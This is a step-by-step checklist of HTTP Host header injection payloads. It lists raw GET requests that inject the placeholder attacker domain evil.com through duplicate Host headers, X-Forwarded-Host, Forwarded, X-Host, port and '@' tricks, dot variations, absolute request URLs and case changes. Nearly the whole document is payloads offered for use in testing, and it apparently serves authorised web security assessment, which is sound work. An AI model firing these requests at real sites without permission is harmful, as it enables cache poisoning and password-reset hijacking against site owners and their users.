## Host Header Injection – Step-by-Step Checklist

### STEP 1: Baseline Request
```http
GET /example HTTP/1.1
Host: vulnerable-website.com
### STEP 2: Duplicate Host Headers
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: evil.com
### STEP 3: Duplicate Host (Same Value First)
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: vulnerable-website.com
Host: evil.com
### STEP 4: Reverse Host Header Order
GET /example HTTP/1.1
Host: evil.com
Host: vulnerable-website.com
GET /example HTTP/1.1
Host: evil.com
Host: evil.com
Host: vulnerable-website.com
### STEP 5: Host + X-Forwarded-Host
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.com
GET /example HTTP/1.1
Host: evil.com
X-Forwarded-Host: vulnerable-website.com
### STEP 6: Alternative Forward Headers
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Host: evil.com
GET /example HTTP/1.1
Host: vulnerable-website.com
Forwarded: host=evil.com
GET /example HTTP/1.1
Host: vulnerable-website.com
X-HTTP-Host-Override: evil.com
### STEP 7: Port Injection
GET /example HTTP/1.1
Host: vulnerable-website.com:evil
GET /example HTTP/1.1
Host: vulnerable-website.com:1234
### STEP 8: @ Injection
GET /example HTTP/1.1
Host: vulnerable-website.com@evil.com
GET /example HTTP/1.1
Host: evil.com@vulnerable-website.com
### STEP 9: Dot Variations
GET /example HTTP/1.1
Host: vulnerable-website.com.
GET /example HTTP/1.1
Host: .vulnerable-website.com
GET /example HTTP/1.1
Host: vulnerable-website.com..evil.com
### STEP 10: Absolute URL in Request Line
GET http://evil.com/example HTTP/1.1
Host: vulnerable-website.com
GET http://vulnerable-website.com/example HTTP/1.1
Host: evil.com
### STEP 11: Case Sensitivity
GET /example HTTP/1.1
host: evil.com
Host: vulnerable-website.com
GET /example HTTP/1.1
HOST: evil.com
Host: vulnerable-website.com
### STEP 12: Multiple Header Combination
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: evil.com
X-Forwarded-Host: evil.com
Forwarded: host=evil.com
